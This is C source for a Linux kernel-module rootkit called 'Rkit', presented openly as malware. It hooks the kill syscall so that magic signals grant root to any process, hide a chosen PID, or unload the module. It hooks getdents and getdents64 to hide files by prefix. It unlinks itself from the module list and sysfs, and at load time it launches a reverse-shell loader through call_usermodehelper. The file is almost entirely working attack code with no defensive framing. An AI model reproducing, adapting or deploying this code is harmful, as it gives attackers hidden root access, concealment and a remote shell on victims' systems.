/*
 * Rkit Module v1.0.0
 * Features:
 *  - Backdoor: signal 64 gives root
 *  - PID hiding: signal 63 hides a process by PID
 *  - File hiding: hides directory entries prefixed by hide_prefix
 *  - Self-hide: removes module from /proc/modules and /sys/modules
 *  - Self-unload: signal 62 unloads the module
 *
 * Author: IC3
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/kobject.h>
#include <linux/slab.h>
#include <linux/cred.h>
#include <linux/delay.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("IC3");
MODULE_DESCRIPTION("Combined root backdoor, hide PID, hide files, self-hide and self-unload module");
MODULE_VERSION("1.0.0");

#define PTREGS_SYSCALL_STUBS 1
#define SIG_ROOT   64
#define SIG_HIDE   63
#define SIG_UNLOAD 62
#define NUM_HOOKS  3


static char hide_prefix[NAME_MAX] = "_rkit";
static char hide_pid[NAME_MAX]    = "";
static struct list_head *prev_module;
static short module_hidden = 0;

static struct ftrace_hook hooks[];


static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);
static asmlinkage long (*orig_kill)(const struct pt_regs *);

/* linux_dirent struct (not exportet anymore) */
struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
};

/* Helpers */
static void set_root(void)
{
    struct cred *new;
    new = prepare_creds();
    if (!new)
        return;
    new->uid.val = new->gid.val = 0;
    new->euid.val = new->egid.val = 0;
    new->suid.val = new->sgid.val = 0;
    new->fsuid.val = new->fsgid.val = 0;
    commit_creds(new);
}

static void hide_module(void)
{
    if (module_hidden)
        return;
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    module_hidden = 1;
}

static void show_module(void)
{
    if (!module_hidden)
        return;
    list_add(&THIS_MODULE->list, prev_module);
    module_hidden = 0;
}

/* sys_kill */
asmlinkage long hook_kill(const struct pt_regs *regs)
{
    pid_t pid = regs->di;
    int sig  = regs->si;

    if (sig == SIG_ROOT) {
        printk(KERN_INFO "rkit: granting root to pid %d\n", pid);
        set_root();
        return 0;
    }
    if (sig == SIG_HIDE) {
        printk(KERN_INFO "rkit: hiding pid %d\n", pid);
        sprintf(hide_pid, "%d", pid);
        return 0;
    }
    if (sig == SIG_UNLOAD) {
        printk(KERN_INFO "rkit: unloading module via signal\n");
        /* restore ftrace hooks and reveal module before unload */
        show_module();
        fh_remove_hooks(hooks, NUM_HOOKS);
        return 0;
    }

    return orig_kill(regs);
}

/* sys_getdents64 */
asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent = (void *)regs->si;
    struct linux_dirent64 *buf, *cur, *prev = NULL;
    long error;
    int ret = orig_getdents64(regs);
    if (ret <= 0)
        return ret;

    buf = kzalloc(ret, GFP_KERNEL);
    if (!buf)
        return ret;

    error = copy_from_user(buf, dirent, ret);
    if (error)
        goto out;

    {
        unsigned long offset = 0;
        while (offset < ret) {
            cur = (void *)buf + offset;

            if ((hide_prefix[0] && !strncmp(cur->d_name, hide_prefix, strlen(hide_prefix))) ||
                (hide_pid[0] && !strcmp(cur->d_name, hide_pid))) {
                if (cur == buf) {
                    ret -= cur->d_reclen;
                    memmove(cur, (void *)cur + cur->d_reclen, ret);
                    continue;
                }
                prev->d_reclen += cur->d_reclen;
            } else {
                prev = cur;
            }
            offset += cur->d_reclen;
        }
    }

    error = copy_to_user(dirent, buf, ret);
out:
    kfree(buf);
    return ret;
}

/* sys_getdents (32-bit compat) */
asmlinkage int hook_getdents(const struct pt_regs *regs)
{
    struct linux_dirent *dirent = (void *)regs->si;
    struct linux_dirent *buf, *cur, *prev = NULL;
    long error;
    int ret = orig_getdents(regs);
    if (ret <= 0)
        return ret;

    buf = kzalloc(ret, GFP_KERNEL);
    if (!buf)
        return ret;

    error = copy_from_user(buf, dirent, ret);
    if (error)
        goto out;

    {
        unsigned long offset = 0;
        while (offset < ret) {
            cur = (void *)buf + offset;

            if ((hide_prefix[0] && !strncmp(cur->d_name, hide_prefix, strlen(hide_prefix))) ||
                (hide_pid[0] && !strcmp(cur->d_name, hide_pid))) {
                if (cur == buf) {
                    ret -= cur->d_reclen;
                    memmove(cur, (void *)cur + cur->d_reclen, ret);
                    continue;
                }
                prev->d_reclen += cur->d_reclen;
            } else {
                prev = cur;
            }
            offset += cur->d_reclen;
        }
    }

    error = copy_to_user(dirent, buf, ret);
out:
    kfree(buf);
    return ret;
}

/* ftrace hooks */
static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill",      hook_kill,      &orig_kill),
    HOOK("__x64_sys_getdents64", hook_getdents64,&orig_getdents64),
    HOOK("__x64_sys_getdents",   hook_getdents,  &orig_getdents),
};

static void start_revshell_loader(void)
{
    static char *argv[] = { "/shell", "rsh", NULL };
    static char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

    int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    if (ret)
        printk(KERN_INFO "rkit: Failed to run loader with rsh (ret=%d)\n", ret);
    else
        printk(KERN_INFO "rkit: Successfully started loader with rsh\n");
}

static int __init rkit_init(void)
{
    int err;
    err = fh_install_hooks(hooks, NUM_HOOKS);
    if (err)
        return err;
    hide_module();
    printk(KERN_INFO "rkit: loaded\n");
    ssleep(5);
    printk(KERN_INFO "rkit: starting usermode revshell loader\n");
    start_revshell_loader();
    return 0;
}

static void __exit rkit_exit(void)
{
    show_module();
    fh_remove_hooks(hooks, NUM_HOOKS);
    printk(KERN_INFO "rkit: unloaded\n");
}

module_init(rkit_init);
module_exit(rkit_exit);
